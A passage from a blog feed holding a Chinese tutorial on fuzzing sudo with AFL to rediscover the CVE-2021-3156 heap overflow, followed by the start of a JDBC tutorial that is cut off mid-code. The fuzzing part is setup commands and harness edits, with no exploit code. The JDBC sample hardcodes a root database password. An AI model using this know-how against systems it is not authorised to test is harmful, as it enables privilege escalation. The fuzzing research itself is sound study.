AFL编译sudo</h2><p>AFL的测试是以白盒测试为基础的，我们要使用AFL的编译器对代码进行重新编译；虽然黑盒也行，但是要依靠插桩和qemu</p><p>进入sudo文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CC=afl-gcc ./configure --disable-shared</span><br><span class="line">make clean</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/0d8829a95da80ff2fc0f201870bdaac0.png" alt="image-20220411154306319" />出现图中<code>afl-as</code>之类的提示字符，说明正在使用afl编译</p><h2 id="afl进行分析与fuzz"><a class="markdownIt-Anchor" href="#afl进行分析与fuzz"></a> AFL进行分析与fuzz</h2><p>AFL的分析方式有两种</p><ul><li><p>输入为文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i input_cases -o output_cases -- ./app.bin @@</span><br></pre></td></tr></table></figure><p>@@就代表我们的输入示例</p></li><li><p>输入为<code>stdin</code>输入流</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i input_cases -o output_cases -- ./app.bin</span><br></pre></td></tr></table></figure></li></ul><p>但是这里我们的是使用sudo参数处理的字符串</p><p>原作者通过搜索<code>afl fuzz argv</code>发现了在AFL的<code>experimental</code>实验性质文件夹中的<code>argv-fuzz-inl.h</code>头文件，具有以下描述</p><p><img src="https://img.joe1sn.top/uploads/big/a30c3c558427f1ccd4109b75c8038d04.png" alt="image-20220411155120876" /></p><p>所以我们找到sudo main函数的文件，并且将<code>argv-fuzz-inl.h</code>复制到同一个文件夹下，然后在<code>main</code>函数附近添加<code>AFL_INIT_ARGV()</code>函数</p><img src="https://img.joe1sn.top/uploads/big/5626908421e1397f67aaa9f2398fbc12.png" alt="image-20220411155834192" style="zoom:80%;" /><p><img src="https://img.joe1sn.top/uploads/big/53c3edb228a27cb149569c7ef2e2bcdf.png" alt="image-20220411155926053" /></p><p><strong><code>AFL_INIT_ARGV()</code>的原理</strong></p><p>可以看原来的头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> AFL_INIT_ARGV() do &#123; argv = afl_init_argv(&amp;argc); &#125; while (0)</span></span><br></pre></td></tr></table></figure><p><code>afl_init_argv</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span>** <span class="title function_">afl_init_argv</span><span class="params">(<span class="type">int</span>* argc)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">char</span>  in_buf[MAX_CMDLINE_LEN];</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span>* ret[MAX_CMDLINE_PAR];</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* ptr = in_buf;</span><br><span class="line">  <span class="type">int</span>   rc  = <span class="number">1</span>; <span class="comment">/* start after argv[0] */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(<span class="number">0</span>, in_buf, MAX_CMDLINE_LEN - <span class="number">2</span>) &lt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> (*ptr) &#123;</span><br><span class="line">    ret[rc] = ptr;</span><br><span class="line">      </span><br><span class="line">    <span class="comment">/* insert &#x27;\0&#x27; at the end of ret[rc] on first space-sym */</span></span><br><span class="line">    <span class="keyword">while</span> (*ptr &amp;&amp; !<span class="built_in">isspace</span>(*ptr)) ptr++;</span><br><span class="line">    *ptr = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    ptr++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* skip more space-syms */</span></span><br><span class="line">    <span class="keyword">while</span> (*ptr &amp;&amp; <span class="built_in">isspace</span>(*ptr)) ptr++;</span><br><span class="line">    rc++;</span><br><span class="line">  &#125;</span><br><span class="line">  *argc = rc;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本质上该函数就是一个宏定义，将原始的<code>argv</code>替换为<code>afl_init_argv</code>，从而能被后续的fuzzer所分析</p><p><code>afl_init_argv</code>流程</p><ul><li>输入流<code>in_buf</code>开始读取</li><li>指针不为NULL和空格一直读取</li><li>出现空格或NULL置结尾为NULL，<ul><li>若为空格，参数数目<code>rc</code>+1</li></ul></li><li>最后返回<code>ret</code>，让<code>ret</code>代替了原来的<code>argv</code>，同时<code>argc</code>被改写为<code>rc</code></li></ul><h2 id="重编译sudo"><a class="markdownIt-Anchor" href="#重编译sudo"></a> 重编译sudo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CC=afl-gcc ./configure --disable-shared</span><br><span class="line">make clean &amp;&amp; make -j8</span><br></pre></td></tr></table></figure><p>这里就直接略过afl的测试了，因为肯定会崩溃</p><p><img src="https://img.joe1sn.top/uploads/big/0208d8e5bfeb9aea178c81035e2e4bae.png" alt="image-20220411161732603" /></p><p><img src="https://img.joe1sn.top/uploads/big/1e6fb1ff1919070ada5e8b05a4898b63.png" alt="image-20220411161840644" /></p><h1 id="afl是如何工作的"><a class="markdownIt-Anchor" href="#afl是如何工作的"></a> AFL是如何工作的</h1><p>这里开始是第二节的内容了。</p><p>我们的主要目标是fuzz出sudo存在的CVE-2021-3156漏洞，然后完成exp的编写，所以并不会细致的讲解fuzz的具体工作原理和过程。不过fuzz主要有以下几个过程：</p><ul><li><p>预处理</p><ol><li>分析和获取有用信息，使用PIN，符号执行，污点检查</li><li>黑盒白盒</li></ol></li><li><p>输入构建</p><p>从数据 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>（种子）产生大量变异数据 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span>。</p></li><li><p>输入选择</p><p>过滤无效数据，优化模糊测试</p></li><li><p>评估</p><p>大多数关于模糊的研究集中在两个指标上：覆盖率和利用漏洞的平均时间</p></li></ul><h2 id="关于上一节的报错"><a class="markdownIt-Anchor" href="#关于上一节的报错"></a> 关于上一节的报错</h2><p>这里就体现了互联网的艺术：<a href="https://milek7.pl/howlongsudofuzz/%EF%BC%8C%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E9%81%87%E5%88%B0%E4%BA%86%E7%9B%B8%E5%90%8C%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%98%AF%EF%BC%9A">https://milek7.pl/howlongsudofuzz/，这篇文章遇到了相同的问题他的解决方案是：</a></p><p>将afl-gcc编译器替换为基于LLVM的<code>afl-clang</code>编译</p><blockquote><p>For some reason afl-gcc instrumentation didn’t work, so I used LLVM-based one. We just need to override <code>CC</code> for <code>./configure</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC=afl-clang-fast ./configure</span><br></pre></td></tr></table></figure></blockquote><p><strong>Clang</strong>是个啥？</p><p>了解过编译原理的人，或者编写恶意代码的人对这个一定很熟悉</p><blockquote><p>The Clang project provides a language front-end and tooling infrastructure for languages in the C language family (C, C++, Objective C/C++, OpenCL, CUDA, and RenderScript) for the <a href="https://www.llvm.org/">LLVM</a> project. Both a GCC-compatible compiler driver (<code>clang</code>) and an MSVC-compatible compiler driver (<code>clang-cl.exe</code>) are provided. You can <a href="https://clang.llvm.org/get_started.html">get and build</a> the source today.</p></blockquote><p>编译器的结构</p><p><img src="https://img.joe1sn.top/uploads/big/e558964575a6d2a58e84d70d04b01ffc.png" alt="image-20220411163626555" /></p><p>简单理解的话就是说Clang是gcc编译器的另外一个实现</p><p>同时AFL也支持使用<code>afl-clang</code>，和<code>afl-gcc</code>的用法相同</p><blockquote><p>The clang wrappers (afl-clang and afl-clang++) can be used in the same way; clang users may also opt to leverage a higher-performance instrumentation mode, as described in llvm_mode/README.llvm.</p></blockquote><p>这就涉及到<code>afl-clang-fast</code>的安装了</p><h2 id="解决上一节的报错"><a class="markdownIt-Anchor" href="#解决上一节的报错"></a> 解决上一节的报错</h2><p><strong>安装afl-clang和afl-clang++</strong></p><ul><li><p>安装clang和llvm（dockerfile中已经提前装好了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install llvm clang</span><br></pre></td></tr></table></figure></li><li><p>进入编译安装afl-clang和afl-clang++</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd llvm_mode</span><br><span class="line">make</span><br><span class="line">cd ..</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></li></ul><p><strong>重编译sudo</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC=afl-clang-fast ./configure --disable-shared &amp;&amp; make -j8</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/67a66b9d0ed9dd1b0be5e7a8c5031f78.png" alt="image-20220411170002807" /></p><p>这里我发现其实在user用户下也会Segmentation fault，这个是因为权限的问题，后面就大致能感受出来了</p><h2 id="开始fuzz-2"><a class="markdownIt-Anchor" href="#开始fuzz-2"></a> 开始Fuzz</h2><p><strong>创建输入输出</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir ../input ../output</span><br><span class="line">echo -en &quot;-l\x00&quot; &gt; ../input/testcase1</span><br><span class="line">afl-fuzz -i ../input/ -o ../output/ -- ./src/sudo</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/df0ee6e0b7abad069975cccff20b3121.png" alt="image-20220411170434520" /></p><h2 id="afl的说明"><a class="markdownIt-Anchor" href="#afl的说明"></a> AFL的说明</h2><p>AFL是以基于覆盖率测试的模糊测试工具，将编译过的数据送到被测试的程序中。被测试的程序中有使用AFL编译器编译时的插桩代码(<code>__afl_maybe_log</code>)，可以让编译器返回那些函数被执行过（被覆盖到）</p><p>例如在windows的模糊测试中，可以使用DynamoRIO对文件进行覆盖率测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\winafl\build_x64\bin\Release&gt;D:\HackTools\Fuzz\DynamoRIO-Windows-8.0.0-1\bin64\drrun.exe -t drcov -- test.exe not_kitty.bmp</span><br><span class="line">Error 1</span><br></pre></td></tr></table></figure><p>然后再IDA中加载覆盖率文件</p><p><img src="https://img.joe1sn.top/uploads/big/969249f2d05503b202ad2b8561cc624a.png" alt="image-20220411175334598" /></p><p>其中绿色的就是单次执行被覆盖到的代码，被覆盖到的代码越多，测试也就越准确。</p><p>所以AFL可以通过插桩代码，不断改进输入的数据，从而得到更高的覆盖率</p><h2 id="会得到漏洞吗"><a class="markdownIt-Anchor" href="#会得到漏洞吗"></a> 会得到漏洞吗？</h2><p><strong>不会的</strong>，在<a href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">前文</a>中已经写过了</p><blockquote><p><code>sudoedit</code>就是一个链接到<code>sudo</code>的文件</p></blockquote><p>但是我们是尝试独立挖掘出这个漏洞，并且 <strong>sudoedit</strong> 是作为独立插件编译得，所以我们并不能直接的测试<code>sudoedit -s</code></p><p><strong>在测试前了解你要测试的程序</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">man sudo</span><br><span class="line">whereis sudo</span><br><span class="line">whereis sudoedit</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/f2b8b0e3bf900339ef85824fb9500032.png" alt="image-20220411185630941" /></p><p><img src="https://img.joe1sn.top/uploads/big/1190735e7304168525f26ff33563b32d.png" alt="image-20220411185744345" /></p><p>&gt;&gt;问题</p><ul><li><p>This system has been minimized by removing packages and content that are not required on a system that users do not log <a href="http://into.To">into.To</a> restore this content, including manpages, you can run the ‘unminimize’ command. You will still need to ensure the ‘man-db’ package is installed.</p><p>解决方法和造成原因在这儿：<a href="https://github.com/docker/for-linux/issues/639#issuecomment-478765756">https://github.com/docker/for-linux/issues/639#issuecomment-478765756</a></p><p>直接输入<code>unminimize</code>，这会花很长的时间，真的很长</p></li></ul><p><strong>新的思路</strong></p><p>细心一点可能会发现在之前的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span>** <span class="title function_">afl_init_argv</span><span class="params">(<span class="type">int</span>* argc)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">char</span>  in_buf[MAX_CMDLINE_LEN];</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span>* ret[MAX_CMDLINE_PAR];</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* ptr = in_buf;</span><br><span class="line">  <span class="type">int</span>   rc  = <span class="number">1</span>; <span class="comment">/* start after argv[0] */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(<span class="number">0</span>, in_buf, MAX_CMDLINE_LEN - <span class="number">2</span>) &lt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> (*ptr) &#123;</span><br><span class="line">    ret[rc] = ptr;</span><br><span class="line">      </span><br><span class="line">    <span class="comment">/* insert &#x27;\0&#x27; at the end of ret[rc] on first space-sym */</span></span><br><span class="line">    <span class="keyword">while</span> (*ptr &amp;&amp; !<span class="built_in">isspace</span>(*ptr)) ptr++;</span><br><span class="line">    *ptr = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    ptr++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* skip more space-syms */</span></span><br><span class="line">    <span class="keyword">while</span> (*ptr &amp;&amp; <span class="built_in">isspace</span>(*ptr)) ptr++;</span><br><span class="line">    rc++;</span><br><span class="line">  &#125;</span><br><span class="line">  *argc = rc;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>rc=1</code>，说明是从<code>argv[1]</code>开始创建fake_argv的，但是我们知道<code>argv[0]</code>就是程序自身，那么我们就可以通过fuzz <code>argv[0]</code>从而找到sudoedit。那么修改试试看，重新编译sudo</p><p><img src="https://img.joe1sn.top/uploads/big/57cef8cb027c29a2455c878105f39006.png" alt="image-20220411195138050" /></p><p>&gt;&gt;问题</p><ul><li><p>为什么没有变化</p><p>改的是同级目录下的<code>argv-fuzz-inl.h</code>文件</p></li></ul><p>**为什么都一样？**问题的解决同样在这里：<a href="https://milek7.pl/howlongsudofuzz/">https://milek7.pl/howlongsudofuzz/</a></p><blockquote><p>Quick test shows that sudo/sudoedit selection doesn’t work correctly from testcases passed in stdin, because for some reason it uses <code>__progname</code>.</p></blockquote><p>sudo/sudoedit不会直接使用argv[0]作为程序名称，而是使用<code>__progname</code></p><p>阅读sudo源代码我们发现</p><p><img src="https://img.joe1sn.top/uploads/big/b7b60307fbd2f941b818dab1a01f3a92.png" alt="image-20220411190411773" /></p><p><img src="https://img.joe1sn.top/uploads/big/e8aa3bd4c3c5953c534746ae56f3de1d.png" alt="image-20220411190748133" /></p><ul><li><p>在<code>main</code>中</p><p>参数数目&gt;0，传递<code>argv[0]</code>，否则使用sudo作为参数</p></li><li><p>在<code>ep1\sudo-1.8.31p2\lib\util\progname.c: init_progname</code>中</p><p>定义了<code>HAVE___PROGNAME</code>，那么在编译时如果<code>__progname</code>不存在，才会用<code>argv[0]</code>做成程序名</p><p>（因为vscode认为是windwos环境，所以这里是灰色的）</p></li><li><p>解决：直接删掉后重新编译</p></li></ul><p><img src="https://img.joe1sn.top/uploads/big/f8957da611aa4f7cd4cabde4f51d316b.png" alt="image-20220411200458294" /></p><h2 id="开始多核fuzz"><a class="markdownIt-Anchor" href="#开始多核fuzz"></a> 开始多核fuzz</h2><ul><li><p><code>-M</code></p><p>选定主fuzz的单元（Master）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -M master -i /tmp/in -o /tmp/out/ -- ./src/sudo</span><br></pre></td></tr></table></figure></li><li><p>-S</p><p>选定为从属fuzz单元（Slave）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -S slave -i /tmp/in -o /tmp/out/ -- ./src/sudo</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img.joe1sn.top/uploads/big/d5b41e9d5a6683942cfd3091d5a0cfb8.png" alt="image-20220411201155776" /></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sudo堆溢出提权从fuzz到exp-1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sudo堆溢出提权从fuzz到exp-1&quot;&gt;&lt;/a&gt; SUDO堆溢出提权：从fuzz到exp [1]&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;前文：&lt;a href=&quot;https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/&quot;&gt;https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程&lt;/p&gt;
&lt;p&gt;原始视频合集：&lt;a href=&quot;https://www.youtube.com/watch?v=uj1FTiczJSE&amp;amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx&quot;&gt;https://www.youtube.com/watch?v=uj1FTiczJSE&amp;amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原始Blog：&lt;a href=&quot;https://liveoverflow.com/why-pick-sudo-research-target-part-1/&quot;&gt;https://liveoverflow.com/why-pick-sudo-research-target-part-1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原作者代码仓库：&lt;a href=&quot;https://github.com/LiveOverflow/pwnedit&quot;&gt;https://github.com/LiveOverflow/pwnedit&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb笔记-JDBC</title>
    <link href="https://joe1sn.eu.org/2022/03/19/java-day3-JDBC/"/>
    <id>https://joe1sn.eu.org/2022/03/19/java-day3-JDBC/</id>
    <published>2022-03-19T11:49:07.000Z</published>
    <updated>2022-09-20T08:03:59.519Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jdbc操作"><a class="markdownIt-Anchor" href="#jdbc操作"></a> JDBC操作</h1><ul><li>基本概念</li><li>快速入门</li><li>对JDBC中各个接口和类详解</li></ul><span id="more"></span><h2 id="jdbc概念"><a class="markdownIt-Anchor" href="#jdbc概念"></a> JDBC概念</h2><blockquote><p>**概念：**Java DataBase Connectivity ，Java数据库连接</p></blockquote><p>本质（类似Django的ORM）:The sun公司定义的一套操作所有关系型数据库的规则（接口）。各个厂家根据接口去实现。我们可以是有这套接口编程，真正的驱动时jar包中的实现类</p><p><img src="https://img.joe1sn.top/uploads/big/4623f675dcd34bb059e058b0801cf300.jpg" alt="" /></p><h2 id="快速入门"><a class="markdownIt-Anchor" href="#快速入门"></a> 快速入门</h2><p><strong>简单步骤</strong></p><ol><li>导入驱动jar包</li><li>注册驱动</li><li>数据库连接对象Connection</li><li>定义sql</li><li>获取执行SQL语句的Statement对象</li><li>执行sql，接受返回结果</li><li>处理结果</li><li>释放资源</li></ol><p><strong>简单使用</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> learn.jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">JDBC快速入门</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//1.导入驱动jar包</span></span><br><span class="line">        <span class="comment">//2.注册驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//3.获取数据库连接对象</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/javaweb&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;J8L  7T&quot;</span>);</span><br><span class="line">        <span class="comment">//4.定义sql语句</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;update user set UID=00000 where XH=302&quot;</span>;</span><br><span class="line">        <span class="comment">//5.获取执行sql对象</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">        <span class="comment">//6.执行sql方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> statement.executeUpdate(sql);</span><br><span class="line">        <span class="comment">//7.处理结果</span></span><br><span class="line">        System.out.println(count);</span><br><span class="line">        <span class="comment">//8.释放资源</span></span><br><span class="line">        statement.close();</span><br><span class="line">        conn.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>步骤详解</strong></p><ul><li><p>DriverManager：驱动管理对象</p><ol><li><p>注册驱动</p><p>注册与给定的驱动程序 <code>DriverManager</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerDriver</span><span class="params">(Driver driver)</span>  </span><br></pre></td></tr></table></figure><p>写代码使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br></pre></td></tr></table></figure><p>为静态代码使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mysql.cj.jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Driver</span> <span class="keyword">extends</span> <span class="title class_">com</span>.mysql.cj.jdbc.NonRegisteringDriver <span class="keyword">implements</span> <span class="title class_">java</span>.sql.Driver &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Driver</span><span class="params">()</span> <span class="keyword">throws</span> java.sql.SQLException &#123; <span class="comment">/* compiled code */</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mysql5.0以上可以不用注册驱动</p></li><li><p>获取数据库连接</p><p>尝试建立与给定数据库URL的连接。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String url, String user, String password)</span> </span><br></pre></td></tr></table></figure><p>url：<code>jdbc:mysql://ip:port/database</code></p><p>默认为本地sql地址及默认端口</p></li></ol></li><li><p>Connection：数据库连接对象</p><ol><li>获取执行sql对象</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Statement <span class="title function_">createStatement</span><span class="params">()</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement <span class="title function_">prepareStatement</span><span class="params">(String sql)</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>管理事务</p><p>开启事务：参数为false即开启事务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> autoCommit)</span></span><br></pre></td></tr></table></figure><p>提交事务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">commit</span><span class="params">()</span></span><br></pre></td></tr></table></figure><p>回滚事务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">rollback</span><span class="params">()</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>Statement：执行sql对象</p><p>执行任意sql</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">execute</span><span class="params">(String sql)</span></span><br></pre></td></tr></table></figure><p>执行DML DDL语句，返回影响的行数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">executeUpdate</span><span class="params">(String sql)</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ResultSet <span class="title function_">executeQuery</span><span class="params">(String sql)</span></span><br></pre></td></tr></table></figure></li><li><p>ResultSet：结果集对象</p></li><li><p>PreparedStatement：执行sql对象</p></li></ul><h2 id="jdbc工具类jdbcutils"><a class="markdownIt-Anchor" href="#jdbc工具类jdbcutils"></a> JDBC工具类：JDBCUtils</h2><p>目的：简化书写</p><p>分析：</p><ol><li>注册驱动也抽取</li><li>抽取一个方法获取连接对象</li><li>抽取方法释放资源</li></ol><p>抽取连接对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>close释放资源重载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 